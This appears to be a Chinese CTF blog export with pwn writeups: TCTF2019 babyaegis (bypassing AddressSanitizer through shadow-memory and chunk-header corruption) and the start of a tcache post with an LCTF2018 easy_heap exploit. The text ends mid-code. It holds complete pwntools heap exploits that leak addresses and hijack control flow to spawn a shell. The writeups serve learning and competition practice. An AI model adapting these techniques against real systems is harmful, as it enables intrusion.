add_task(11,1,0x20,&#39;a&#39;*0x20) add_task(12,1,0x70,&#39;a&#39;*0x70) add_task(13,1,0x20,&#39;a&#39;*0x20) go(12) delete(12) delete(11) add_task(11,1,0xa8,p64(heap_base + 0x24b0).ljust(0xa8,&#39;\x00&#39;)) # control task_12 -&gt; ctx sleep(1) p.interactive(&quot;zs0zrc&gt;&gt;&quot;) #gdb.attach(p,&quot;b EVP_CipherUpdate&quot;) heap_base = 0 mc = Myencrypt(&#39;a&#39;*0x20,&#39;b&#39;*0x10)#AES object leak_heap() leak_libc() get_shell() babyaegis我看的第一道题就是这道，被7个防护机制惊呆了…….是我孤陋寡闻了。 防护机制：☁ aegis [master] ⚡ checksec aegis [*] &#39;/home/zs0zrc/game/TCTF2019/pwn/babyaegis_pwn/aegis/aegis&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled ASAN: Enabled UBSAN: Enabled AddressSanitizer的前置知识其中我没见过的是ASAN和 UBSAN。 ASAN是指AddressSanitizer ，这是一款用于检测C/C++内存错误的工具。而UBSAN是指UndefinedBehaviorSanitizer , 这是一款用于检测未定义行为的检测器，比如使用没对齐的或者为空的指针什么的。 AddressSanitizer的基本功能： 检测以下行为 Use after free (dangling pointer dereference) Heap buffer overflow Stack buffer overflow Global buffer overflow Use after return Use after scope Initialization order bugs Memory leaks AddressSanitizer的基本原理：文章链接 AddressSanitizer的官方文档：链接 AddressSanitizer会对程序中每8个字节内存映射到 shadow memory中对应的一个字节，对内存的读写操作都会对shadow memory对应的内存进行读取，判断内存读写操作是否合法。它检测bufferoverflower的算法思想也比较简单，通过在buffer两边分配Redzone，并且加上锁，如果这两块区域被访问了就说明overflower了。 shadow memory映射规则 shadow = (Mem&gt;&gt;3) + 0x7fff8000; 对于栈上的变量，会在它原来分配的内存两边分配额外的Redzone，并且将这两边区域内存加锁，不允许访问，如果被访问了就说明overflow了。 AddressSanitizer会hoo 住malloc和 free函数，使用它自己定义的分配函数。并且它分配的chunk头部0x10个字节是一些描述chunk状态的字段。不同size分配的内存区域不同， 0x10大小的内存分布都是从0x602000000010开始的，并且 free掉后的内存正常情况下是不会被再次分配的。 Chunkheader结构体 struct ChunkHeader { // 1-st 8 bytes. u32 chunk_state : 8; // Must be first. u32 alloc_tid : 24; u32 free_tid : 24; u32 from_memalign : 1; u32 alloc_type : 2; u32 rz_log : 3; u32 lsan_tag : 2; // 2-nd 8 bytes // This field is used for small sizes. For large sizes it is equal to // SizeClassMap::kMaxSize and the actual size is stored in the // SecondaryAllocator&#39;s metadata. u32 user_requested_size : 29; // align &lt; 8 -&gt; 0 // else -&gt; log2(min(align, 512)) - 2 u32 user_requested_alignment_log : 3; u32 alloc_context_id; }; 基本功能分析：程序一共有五个功能 add note show note update note delete note secret 很明显是个菜单题，下面逐个分析函数 add noteunsigned __int64 __usercall add_note@&lt;rax&gt;(unsigned __int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;) { unsigned __int64 v3; // rdi __int64 v4; // rdx __int64 v5; // rcx __int64 v6; // r8 unsigned __int64 v7; // r9 int v8; // ST18_4 unsigned __int64 id; // rax unsigned __int64 v10; // rdi __int64 v11; // rax unsigned __int64 v12; // rdi unsigned __int64 v13; // rcx __int64 v14; // rcx unsigned __int64 v15; // rdi __int64 *v16; // rax unsigned __int64 v17; // rdi unsigned __int64 v18; // rdi __int64 buf; // [rsp+8h] [rbp-28h] signed int size; // [rsp+1Ch] [rbp-14h] signed int idx; // [rsp+20h] [rbp-10h] signed int i; // [rsp+24h] [rbp-Ch] idx = -1; for ( i = 0; i &lt; 10; ++i ) { v3 = &amp;notes + 8 * i; if ( *((v3 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v3, a3); if ( !*v3 ) { idx = i; break; } } if ( idx == -1 ) error(); printf(&quot;Size: &quot;); size = read_int(&quot;Size: &quot;, a2, v4, v5, v6, v7); if ( size &lt; 0x10 || size &gt; 0x400 ) error(); buf = malloc(size); if ( !buf ) error(); printf(&quot;Content: &quot;); v8 = read_until_nl_or_max(buf, size - 8); printf(&quot;ID: &quot;); id = read_ul(); v10 = v8 + buf; if ( *((v10 &gt;&gt; 3) + 0x7FFF8000) ) id = _asan_report_store8(v10); *v10 = id; v11 = malloc(&amp;word_10); v12 = &amp;notes + 8 * idx; if ( *((v12 &gt;&gt; 3) + 0x7FFF8000) ) v11 = _asan_report_store8(v12); *v12 = v11; v13 = &amp;notes + 8 * idx; if ( *((v13 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(&amp;notes + 8 * idx, a3); if ( !*v13 ) error(); v14 = buf; v15 = &amp;notes + 8 * idx; if ( *((v15 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v15, a3); v16 = *v15; if ( *((*v15 &gt;&gt; 3) + 0x7FFF8000LL) ) v16 = _asan_report_store8(v16); *v16 = v14; v17 = &amp;notes + 8 * idx; if ( *((v17 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v17, a3); v18 = *v17 + 8LL; if ( *((v18 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_store8(v18); *v18 = cfi_check; puts(&quot;Add success!&quot;); return __readfsqword(0x28u); } add note函数可以分配大小在0x10-0x400之间的note，最多分配10个note。 它的结构体： struct note{ char *buf; void *func; }; 分配一个0x10大小的note，观察它在内存中的情况。它包含两个指针，一个指向字符串的chunk，另一个指向ctf_check函数 pwndbg&gt; x/10gx 0x557efd17ecc0 0x557efd17ecc0 &lt;notes&gt;: 0x0000602000000030 0x0000000000000000 0x557efd17ecd0 &lt;notes+16&gt;: 0x0000000000000000 0x0000000000000000 0x557efd17ece0 &lt;notes+32&gt;: 0x0000000000000000 0x0000000000000000 0x557efd17ecf0 &lt;notes+48&gt;: 0x0000000000000000 0x0000000000000000 0x557efd17ed00 &lt;notes+64&gt;: 0x0000000000000000 0x0000000000000000 pwndbg&gt; x/10gx 0x0000602000000000 0x602000000000: 0x02ffffff00000002 0x1480000120000010 0x602000000010: 0xef61616161616161 0xbe0123456789abcd 0x602000000020: 0x02ffffff00000002 0x3b00000120000010 0x602000000030: 0x0000602000000010 0x0000557efc2e2ab0 0x602000000040: 0x0000000000000000 0x0000000000000000 pwndbg&gt; x/10gx 0x0000557efc2e2ab0 0x557efc2e2ab0 &lt;cfi_check&gt;: 0xccccccfffff25be9 0x0000000000841f0f 0x557efc2e2ac0 &lt;__libc_csu_init&gt;: 0x41d7894956415741 0x2b1e258d4c544155 0x557efc2e2ad0 &lt;__libc_csu_init+16&gt;: 0x2b362d8d48550023 0x8949fd8941530023 0x557efc2e2ae0 &lt;__libc_csu_init+32&gt;: 0x08ec8348e5294cf6 0xf06a0fe803fdc148 0x557efc2e2af0 &lt;__libc_csu_init+48&gt;: 0xdb312074ed8548ff 0x0000000000841f0f show noteunsigned __int64 __usercall show_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;) { __int64 v3; // rdx __int64 v4; // rcx __int64 v5; // r8 unsigned __int64 v6; // r9 unsigned __int64 v7; // rdi unsigned __int64 v8; // rdi __int64 v9; // r14 __int64 v10; // rbx unsigned __int64 v11; // rbx __int64 v12; // rdx unsigned __int64 v14; // [rsp+8h] [rbp-28h] signed int v15; // [rsp+10h] [rbp-20h] printf(&quot;Index: &quot;); v15 = read_int(&quot;Index: &quot;, a2, v3, v4, v5, v6); if ( v15 &lt; 0 || v15 &gt;= 10 ) goto LABEL_20; v7 = &amp;notes + 8 * v15; if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v7, a3); if ( !*v7 ) LABEL_20: error(); v8 = &amp;notes + 8 * v15; if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v8, a3); v14 = *v8; if ( *((*v8 &gt;&gt; 3) + 0x7FFF8000LL) ) _asan_report_load8(v14, a3); v9 = *v14; if ( *((v14 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v14, a3); v10 = *v14; if ( *((v14 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v14, a3); v11 = strlen(*v14) + v10 + 1; if ( *((v11 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v11, a3); v12 = *v11; printf(&quot;Content: %s\nID: %lu\n&quot;); return __readfsqword(0x28u); } 根据输入的id，打印对应note的内容。 delete noteunsigned __int64 __usercall delete_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;) { __int64 v3; // rdx __int64 v4; // rcx __int64 v5; // r8 unsigned __int64 v6; // r9 unsigned __int64 v7; // rdi unsigned __int64 v8; // rdi unsigned __int64 v9; // rdi unsigned __int64 v10; // rdi signed int v12; // [rsp+14h] [rbp-Ch] printf(&quot;Index: &quot;); v12 = read_int(&quot;Index: &quot;, a2, v3, v4, v5, v6); if ( v12 &lt; 0 || v12 &gt;= 10 ) goto LABEL_16; v7 = &amp;notes + 8 * v12; if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v7, a3); if ( !*v7 ) LABEL_16: error(); v8 = &amp;notes + 8 * v12; if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v8, a3); v9 = *v8; if ( *((v9 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v9, a3); free(*v9); v10 = &amp;notes + 8 * v12; if ( *((v10 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v10, a3); free(*v10); puts(&quot;Delete success!&quot;); return __readfsqword(0x28u); } 删除note，并将对应的chunk释放掉，但是这里没有将指针清空，所以存在UAF。但是因为ASAN机制，所以利用不了，会报错，见下图。 update noteunsigned __int64 __usercall update_note@&lt;rax&gt;(__int64 a1@&lt;rdi&gt;, __int64 a2@&lt;rsi&gt;, __sanitizer::ScopedErrorReportLock *a3@&lt;r12&gt;) { __int64 v3; // rdx __int64 v4; // rcx __int64 v5; // r8 unsigned __int64 v6; // r9 unsigned __int64 v7; // rdi unsigned __int64 v8; // rdi __int64 v9; // rbx unsigned __int64 v10; // rsi __int64 v11; // rax unsigned __int64 v12; // rdi __asan *v13; // rdi void (__fastcall *v14)(_QWORD, unsigned __int64); // rbx unsigned __int64 v16; // [rsp+8h] [rbp-28h] int v17; // [rsp+18h] [rbp-18h] signed int v18; // [rsp+1Ch] [rbp-14h] printf(&quot;Index: &quot;); v18 = read_int(&quot;Index: &quot;, a2, v3, v4, v5, v6); if ( v18 &lt; 0 || v18 &gt;= 10 ) goto LABEL_29; v7 = &amp;notes + 8 * v18; if ( *((v7 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v7, a3); if ( !*v7 ) LABEL_29: error(); v8 = &amp;notes + 8 * v18; if ( *((v8 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v8, a3); v16 = *v8; printf(&quot;New Content: &quot;); if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v16, a3); v9 = *v16; if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v16, a3); v10 = strlen(*v16) + 1; v17 = read_until_nl_or_max(v9, v10);//overflow printf(&quot;New ID: &quot;); v11 = read_ul(); if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) v11 = _asan_report_load8(v16, a3); v12 = v17 + *v16; if ( *((v12 &gt;&gt; 3) + 0x7FFF8000) ) v11 = _asan_report_store8(v12); *v12 = v11; v13 = (v16 + 8); if ( *(((v16 + 8) &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v13, a3); v14 = *v13; if ( *v13 != cfi_check ) { _asan_handle_no_return(v13); _ubsan_handle_cfi_check_fail_abort(&amp;unk_34B100, v14); } v14(v18, v10); puts(&quot;Update success!&quot;); if ( *((v16 &gt;&gt; 3) + 0x7FFF8000) ) _asan_report_load8(v16, a3); if ( *v16 &gt;&gt; 44 != 6LL ) error(); return __readfsqword(0x28u); } 更新note的content和id。这里存在一个漏洞。在read_until_nl_or_max函数那里，它默认最后一位为null，但是如果我们读入max大小的字符串，那么content的内容就会和ID相连，strlen(*v16) + 1的值就会比content真正的长度大，会造成溢出。 但是因为asan的check机制，会报错并且退出。 secretunsigned __int64 secret() { _BYTE *v0; // rax unsigned __int64 v2; // [rsp+0h] [rbp-10h] if ( secret_enable ) { printf(&quot;Lucky Number: &quot;); v2 = read_ul(); if ( v2 &gt;&gt; 44 ) v0 = (v2 | 0x700000000000LL); else v0 = v2; *v0 = 0; secret_enable = 0; } else { puts(&quot;No secret!&quot;); } return __readfsqword(0x28u); } 这里读取一个地址，然后判断这个地址右移44位是否大于0，如果大于的话就将这个地址与x700000000000LL 进行或运算，然后往这个地址写入一个0。 AddressSanitizer的映射机制调试一下，感受一下AddressSanitizer机制 分配一个0x10大小的note_0 通过vmmap命令查看内存布局 其中0x10大小的chunk分配的起始地址在0x602000000010 pwndbg&gt; x/10gx 0x602000000000 0x602000000000: 0x02ffffff00000002 0x6d00000120000010 ==&gt; chunk header 0x602000000010: 0x0061616161616161 0xbe00000000000000 0x602000000020: 0x02ffffff00000002 0x7180000120000010 ==&gt; chunk header 0x602000000030: 0x0000602000000010 0x000055ffd5a95ab0 0x602000000040: 0x02ffffff00000002 0x6d00000120000010 通过 shadow = addr &gt;&gt;3 + 0x7FFF8000 计算出chunk对应的shadow地址,然后去查看。这里使用中的chunk对应的Redzone的值为0，而fa代表 heap left redzone。这可以通过报错信息获得。 pwndbg&gt; x/10gx 0xc047fff8000 0xc047fff8000: 0x0000fafa0000fafa 0x0000fafa0000fafa 0xc047fff8010: 0x0000fafa0000fafa 0xfafafafafafafafa 0xc047fff8020: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8030: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8040: 0xfafafafafafafafa 0xfafafafafafafafa 将note_0 delete掉，此时对应的shadow redzone 被置为0xfd，表示free heap region。 pwndbg&gt; x/10gx 0xc047fff8000 0xc047fff8000: 0xfdfdfafafdfdfafa 0xfafafafafafafafa 0xc047fff8010: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8020: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8030: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8040: 0xfafafafafafafafa 0xfafafafafafafafa 利用思路利用secret功能来实现update溢出 asan会对shadow memory进行检查，只要我们将下一个chunk的heap left redzone的值修改为0，那么溢出到下一个chunk就不会报错了。 shadow memory = 0x602000000020&gt;&gt;3 + 0x7fff8000 = 0xc047fff8004 通过secret修改下一个chunk的redzone pwndbg&gt; x/10gx 0xc047fff8004 0xc047fff8004: 0xfafafafa0000fa00 0xfafafafafafafafa 0xc047fff8014: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8024: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8034: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8044: 0xfafafafafafafafa 0xfafafafafafafafa 泄露地址 改写redzone后，可以通过溢出修改下一个chunk的 chunk header。 结构体再看一波 struct ChunkHeader { // 1-st 8 bytes. u32 chunk_state : 8; // Must be first. u32 alloc_tid : 24; u32 free_tid : 24; u32 from_memalign : 1; u32 alloc_type : 2; u32 rz_log : 3; u32 lsan_tag : 2; // 2-nd 8 bytes // This field is used for small sizes. For large sizes it is equal to // SizeClassMap::kMaxSize and the actual size is stored in the // SecondaryAllocator&#39;s metadata. u32 user_requested_size : 29; // align &lt; 8 -&gt; 0 // else -&gt; log2(min(align, 512)) - 2 u32 user_requested_alignment_log : 3; u32 alloc_context_id; }; ChunkHeader前8bit存了chunk_state ，后24bit存了 alloc_tid ，以此类推。可以发现ChunkHeader中存有 user_requested_size字段，尝试修改这个字段，可以发现如果将这修改为一个很大的值的话，释放掉chunk就会使 shadow memory 回到初始状态，具体的机制我没看源码了解的就不是很多，看别人的writeup说是内存过大，触发了asan的回收机制。 pwndbg&gt; x/10gx 0xc047fff8000 0xc047fff8000: 0xfafafa00fafafafa 0xfafafafafafafafa 0xc047fff8010: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8020: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8030: 0xfafafafafafafafa 0xfafafafafafafafa 0xc047fff8040: 0xfafafafafafafafa 0xfafafafafafafafa 这时再新建一个note，会发现新分配的note和之前分配的note重叠，并且顺序是相反的。所以我们可以控制note中的内存指针，从而实现任意读写，利用这个先泄露出code_base， 然后泄露got表内容获取libc地址。 此时note和堆的情况 pwndbg&gt; x/10gx 0x5633cc75fcc0 0x5633cc75fcc0 &lt;notes&gt;: 0x0000602000000030 0x0000602000000010 0x5633cc75fcd0 &lt;notes+16&gt;: 0x0000000000000000 0x0000000000000000 0x5633cc75fce0 &lt;notes+32&gt;: 0x0000000000000000 0x0000000000000000 0x5633cc75fcf0 &lt;notes+48&gt;: 0x0000000000000000 0x0000000000000000 0x5633cc75fd00 &lt;notes+64&gt;: 0x0000000000000000 0x0000000000000000 pwndbg&gt; x/10gx 0x0000602000000000 0x602000000000: 0x02ffffff00000002 0x4d00000120000010 0x602000000010: 0x0000602000000030 0x00005633cb8c3ab0 0x602000000020: 0x02ffffff00000002 0x3080000120000010 0x602000000030: 0x0000602000000018 0xbe00000000000000 0x602000000040: 0x0000000000000000 0x0000000000000000 getshell 两种思路，一种是改写_ZN11__sanitizerL15UserDieCallbackE为one_gadeget ，另一种是改写update中的read_until_nl_or_max函数的返回地址。通过libc中的 __enviorn变量，泄露出栈地址，然后将read_until_nl_or_max函数的返回地址改为one_gadget。 改写call_back为one_gadget这里通过覆盖bss段上的_ZN11__sanitizerL15UserDieCallbackE为one_gadget，然后造成内存错误时就会被执行。这能成功的原因是UserDieCallback函数会调用在 bss段上的_ZN11__sanitizerL15UserDieCallbackE所指的函数。 调用链 _asan_handle_no_return(v17, v10, v12, v16, v13, v14); _ubsan_handle_cfi_check_fail_abort(&amp;unk_34B100, v18, v19, v20, v21, v22); if ( __sanitizer::UserDieCallback ) __sanitizer::UserDieCallback(this); v2 = &amp;__sanitizer::InternalDieCallbacks; __sanitizer::UserDieCallback(this)会去调用bss段上的_ZN11__sanitizerL15UserDieCallbackE，所以只要将_ZN11__sanitizerL15UserDieCallbackE覆盖为one_gadget,触发内存错误时就可以getshell了。 改写read_until_nl_or_max的返回地址先泄露出stack的地址，泄露方法和之前的一样，然后将read_until_nl_or_max函数的返回地址修改为one_gadget，read_until_nl_or_max返回时就可以getshell了。 调试计算出read_until_nl_or_max的返回地址和泄露出来stack的地址之间的偏移 但是发现直接覆盖为one_gadget不行, 这里通过覆盖返回地址为gets函数，将栈的内容清空满足one_gadget的条件 exp1from pwn import* context.log_level = &quot;debug&quot; host = &#39;111.186.63.209&#39; port = 6666 #p = process(&#39;./aegis&#39;) p = remote(host,port) elf = ELF(&#39;./aegis&#39;) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def add(idx,size,content): p.sendlineafter(&quot;Choice: &quot;,&#39;1&#39;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendafter(&quot;:&quot;,content) p.sendlineafter(&quot;:&quot;,str(idx)) def show(idx): p.sendlineafter(&quot;:&quot;,&#39;2&#39;) p.sendlineafter(&quot;:&quot;,str(idx)) def update(idx,content,new_idx): p.sendlineafter(&quot;:&quot;,&#39;3&#39;) p.sendlineafter(&quot;: &quot;,str(idx)) p.sendafter(&quot;:&quot;,content) p.sendlineafter(&quot;:&quot;,str(new_idx)) def delete(idx): p.sendlineafter(&quot;:&quot;,&#39;4&#39;) p.sendlineafter(&quot;:&quot;,str(idx)) def secret(add): p.sendlineafter(&quot;:&quot;,&#39;666&#39;) p.sendlineafter(&quot;:&quot;,str(add)) def get_base(): text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[4], 16) print hex(text_base) return text_base #note_add = get_base() + 0xFB0CC0 #d = 0x113954 +get_base() #gdb.attach(p,&#39;b *{}&#39;.format(hex(d))) #success(hex(note_add)) add(0x123456789abcdef,0x10,&#39;a&#39;*0x8) secret(str(0xc047fff8004)) update(0,&#39;a&#39;*0x12,0x123456789) update(0,&#39;a&#39;*0x10 + p64(0x02ffffff00000002)[:7] ,0x01f000000002ff) delete(0) add(0,0x10,p64(0x602000000018)) show(0) p.recvuntil(&quot;Content: &quot;) leak_code = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) code_base = leak_code - 0x114ab0 success(hex(code_base)) puts_got = elf.got[&#39;puts&#39;] update(1,p64(code_base + puts_got)[:2],(code_base+puts_got)&gt;&gt;8) #leak libc show(0) p.recvuntil(&quot;Content: &quot;) leak_libc = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) libc_base = leak_libc - libc.symbols[&#39;puts&#39;] libc.address = libc_base success(hex(libc_base)) one_gadget = libc_base+0x10a38c call_back = code_base + 0xFB0888 update(1,p64(call_back)[:7],0) # overwrite cfg ==&gt; null ,trigger memory error pause() update(0,&#39; &#39;*8,one_gadget) #overwrite call_back ==&gt; one_gadget p.interactive(&quot;zs0zrc&gt;&gt;&quot;) exp2from pwn import* context.log_level = &quot;debug&quot; host = &#39;111.186.63.209&#39; port = 6666 #p = process(&#39;./aegis&#39;) p = remote(host,port) elf = ELF(&#39;./aegis&#39;) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def add(idx,size,content): p.sendlineafter(&quot;Choice: &quot;,&#39;1&#39;) p.sendlineafter(&quot;:&quot;,str(size)) p.sendafter(&quot;:&quot;,content) p.sendlineafter(&quot;:&quot;,str(idx)) def show(idx): p.sendlineafter(&quot;:&quot;,&#39;2&#39;) p.sendlineafter(&quot;:&quot;,str(idx)) def update(idx,content,new_idx): p.sendlineafter(&quot;:&quot;,&#39;3&#39;) p.sendlineafter(&quot;: &quot;,str(idx)) p.sendafter(&quot;:&quot;,content) p.sendlineafter(&quot;:&quot;,str(new_idx)) def delete(idx): p.sendlineafter(&quot;:&quot;,&#39;4&#39;) p.sendlineafter(&quot;:&quot;,str(idx)) def secret(add): p.sendlineafter(&quot;:&quot;,&#39;666&#39;) p.sendlineafter(&quot;:&quot;,str(add)) def get_base(): text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[4], 16) print hex(text_base) return text_base &#39;&#39;&#39; ru_add1 = 0x1146E0 + get_base() ru_add2 = 0x1140D0 + get_base() note_add = get_base() + 0xFB0CC0 success(hex(note_add)) &#39;&#39;&#39; add(0x123456789abcdef,0x10,&#39;a&#39;*0x8) secret(str(0xc047fff8004)) update(0,&#39;a&#39;*0x12,0x123456789) update(0,&#39;a&#39;*0x10 + p64(0x02ffffff00000002)[:7] ,0x01f000000002ff) delete(0) add(0,0x10,p64(0x602000000018)) show(0) p.recvuntil(&quot;Content: &quot;) leak_code = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) code_base = leak_code - 0x114ab0 success(hex(code_base)) puts_got = elf.got[&#39;puts&#39;] update(1,p64(code_base + puts_got)[:2],(code_base+puts_got)&gt;&gt;8) #leak libc show(0) p.recvuntil(&quot;Content: &quot;) leak_libc = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) libc_base = leak_libc - libc.symbols[&#39;puts&#39;] libc.address = libc_base success(hex(libc_base)) one_gadget = libc_base+0x10a38c call_back = code_base + 0xFB0888 update(1,p64(libc.symbols[&#39;__environ&#39;])[:7],0) show(0) p.recvuntil(&quot;Content: &quot;) stack_add = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) success(hex(stack_add)) ret = stack_add - 0x150 update(1,p64(ret)[:7],0) sleep(0.1) p.sendline(&quot;3&quot;) sleep(0.1) p.sendline(&#39;0&#39;) sleep(0.1) p.send(p64(libc.symbols[&#39;gets&#39;])[:7])# overwrite ret ==&gt; gets p.sendline(&#39;a&#39;*0x2 + p64(one_gadget) + &#39;\x00&#39;*0x100)#rop and clear stack p.interactive(&quot;zs0zrc&gt;&gt;&quot;) 总结这道题最主要的难点在于ASAN这个防护，要想办法去绕过它。还有就是要静下心来调试，通过这道题学了很多新东西，很赞的一道题。 Reference https://www.anquanke.com/post/id/175401 https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP http://lordofpwn.kr/index.php/2019/03/28/0ctf-2019-zerotask-writeup/ https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#babyaegis https://www.anquanke.com/post/id/175556#h2-8 https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP https://github.com/scwuaptx/CTF/blob/master/2019-writeup/0ctf/babyaegis.py]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache下的几道pwn题]]></title>
    <url>%2F2019%2F03%2F18%2F2019-3-18-tcache%E4%B8%8B%E7%9A%84%E5%87%A0%E9%81%93pwn%E9%A2%98%2F</url>
    <content type="text"><![CDATA[最近在刷题，这里做几道跟tcache机制相关的题目。 下载地址 LCTF2018 easy_heap防护机制： ☁ easy_heap checksec easy_heap [*] &#39;/home/zs0zrc/pwn/tcache/easy_heap/easy_heap&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 程序很简单，一共有三个功能 1.malloc 2.free 3.put 漏洞在malloc功能里 unsigned __int64 create() { __int64 v0; // rbx __int64 v2; // [rsp+0h] [rbp-20h] int v3; // [rsp+0h] [rbp-20h] unsigned int size; // [rsp+4h] [rbp-1Ch] unsigned __int64 v5; // [rsp+8h] [rbp-18h] v5 = __readfsqword(0x28u); LODWORD(v2) = 0; while ( v2 &lt;= 9 &amp;&amp; *(0x10LL * v2 + buf) ) LODWORD(v2) = v2 + 1; if ( v2 == 10 ) { puts(&quot;full!&quot;); } else { v0 = buf; *(v0 + 16LL * v2) = malloc(0xF8uLL); if ( !*(16LL * v2 + buf) ) { puts(&quot;malloc error!&quot;); exits(); } printf(&quot;size \n&gt; &quot;, v2); size = read_int(); if ( size &gt; 0xF8 ) exits(); *(16LL * v3 + buf + 8) = size; printf(&quot;content \n&gt; &quot;); read_content(*(16LL * v3 + buf), *(16LL * v3 + buf + 8)); } return __readfsqword(0x28u) ^ v5; } 这里在读content时有一个null offbyone漏洞 unsigned __int64 __fastcall read_content(_BYTE *buf, int size) { unsigned int v3; // [rsp+14h] [rbp-Ch] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); v3 = 0; if ( size ) { while ( 1 ) { read(0, &amp;buf[v3], 1uLL); if ( size - 1 &lt; v3 || !buf[v3] || buf[v3] == 10 ) break; ++v3; } buf[v3] = 0; // null offbyone buf[size] = 0; } else { *buf = 0; } return __readfsqword(0x28u) ^ v4; } 利用思路： 程序存在null offbyone漏洞，libc版本是2.27，存在tcache机制。所以先free7个chunk将tcache填满，之后的chunk就会进入unsorted bin中。然后利用null offbyone在free时触发unlink向前合并，就可以泄露出libc地址。最后利用tcache_dup，分配包含_free_hook的chunk，向__free_hook中写入one_gadget来getshell。 exp： from pwn import* context.log_level = &quot;debug&quot; context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] target = &#39;./easy_heap&#39; p = process(target) libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) def new(size,data): p.recv() p.sendline(&quot;1&quot;) p.recvuntil(&quot;&gt; &quot;) p.sendline(str(size)) p.recvuntil(&quot;&gt; &quot;) p.sendline(data) def free(idx): p.recv() p.sendline(&quot;2&quot;) p.recvuntil(&quot;&gt; &quot;) p.sendline(str(idx)) def put(idx): p.recv() p.sendline(&quot;3&quot;) p.recvuntil(&quot;&gt; &quot;) p.sendline(str(idx)) for i in range(10): new(0x20,&quot;\n&quot;) free(1) # 6 free(3) # 5 for i in range(5,10): free(i) free(0) free(2) free(4) for i in range(7): new(0x20,&quot;\n&quot;) new(0x20,&quot;\n&quot;) #chunk_7 new(0xf8,&quot;\n&quot;) #chunk_8 null offbyone chunk_5 for i in range(5): free(i) free(6) #fill tcache free(5) #unlink , put into unsorted bin put(8) leak = u64(p.recv(8)[0:6].ljust(8,&#39;\x00&#39;)) libc_base = leak - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 88 libc.address= libc_base free_hook = libc.symbols[&#39;__free_hook&#39;] one_gadget = 0xfccde + libc_base log.info(&quot;libc_base {}&quot;.format(hex(libc_base))) for i in range(7): new(0x20,&quot;\n&quot;) new(0x20,&quot;\n&quot;) #chunk_9 和 chunk_8 指向同一个地址 free(0) #确保后面可以分配三个chunk free(8) free(9) #double free new(0x20,p64(free_hook)) new(0x20,&quot;\n&quot;) new(0x20,p64(one_gadget)) free(1) p.interactive() hitcon2018 children_tcache防护机制： ☁ public checksec children_tcache [*] &#39;/home/zs0zrc/pwn/tcache/children_tcache/public/children_tcache&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 程序漏洞点在new heap功能里 unsigned __int64 create() { signed int i; // [rsp+Ch] [rbp-2034h] char *dest; // [rsp+10h] [rbp-2030h] unsigned __int64 size; // [rsp+18h] [rbp-2028h] char s; // [rsp+20h] [rbp-2020h] unsigned __int64 v5; // [rsp+2038h] [rbp-8h] v5 = __readfsqword(0x28u); memset(&amp;s, 0, 0x2010uLL); for ( i = 0; ; ++i ) { if 